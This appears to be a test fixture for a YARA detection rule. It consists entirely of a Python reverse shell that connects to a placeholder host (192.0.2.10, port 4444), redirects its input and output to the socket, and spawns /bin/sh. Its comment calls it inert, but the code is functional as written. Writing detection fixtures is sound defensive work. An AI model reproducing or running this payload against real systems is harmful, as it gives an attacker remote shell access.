#!/usr/bin/python3
# Inert YARA fixture for CERBER_MacOS_Python_PTY_Spawn - text only, not a working sample.
import os, socket, pty
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.0.2.10", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
pty.spawn("/bin/sh")
